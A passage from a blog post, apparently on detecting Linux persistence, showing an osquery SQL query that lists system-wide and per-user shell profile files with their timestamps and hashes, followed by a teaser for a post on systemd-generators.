    SELECT NULL AS username, path, filename, size, atime, mtime, ctime
    FROM file
    WHERE 
        path LIKE "/etc/profile.d/%" 
        OR path IN (
            '/etc/profile',
            '/etc/bash.bashrc',
            '/etc/bash.bash_logout'
        )
), user_specific_files AS (
    SELECT username, concat(users.directory, column1)AS path 
    FROM users 
    CROSS JOIN (VALUES('/.bashrc'), ('/.profile'), ('/.bash_profile'), ('/.bash_login'), ('/.bash_logout'))
), user_specific AS (
    SELECT username, path, filename, size, atime, mtime, ctime
    FROM user_specific_files
    JOIN file
    USING(path)
)

SELECT username, path, filename, size, atime, mtime, ctime, md5
FROM (
    SELECT * FROM system_wide
    UNION ALL 
    SELECT * FROM user_specific
)
JOIN hash
USING(path)
ORDER BY mtime DESC;
```

![](/assets/posts/20220206/1134-osquery-shell-profile.png)


### What's next

So we've discussed some of the scripts that are executed when a system boots or a user logs on the VM. In the next blog post, we'll discuss `systemd-generators` which is another boot and logon initialization script.


---


[Photo by Karolina Grabowska from Pexels](https://www.pexels.com/photo/composition-of-different-conchs-on-beige-table-4226881/)